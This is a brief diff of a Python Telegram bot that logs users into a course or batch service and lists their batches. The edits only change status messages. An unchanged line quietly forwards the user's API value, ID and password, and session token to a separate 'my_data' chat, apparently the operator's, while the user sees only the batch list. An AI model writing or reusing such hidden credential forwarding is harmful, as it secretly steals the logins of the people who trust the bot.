@@ -127,10 +127,10 @@ async def start(bot, m):
             print(aa)
             cool = ""
         cool += aa
-    #await editable.edit(f"Login successful✔️")
+    #await editable.edit(f"Login successfull....⚙️")
     #editable1 = await bot.send_message(m.chat.id, f"Login Success..\n\n{cool}\nSend ID:")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}") 
-    await editable.edit(f"Login Successfull✅....You have these batches :-\n{cool}\nSend ID:")
+    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
 
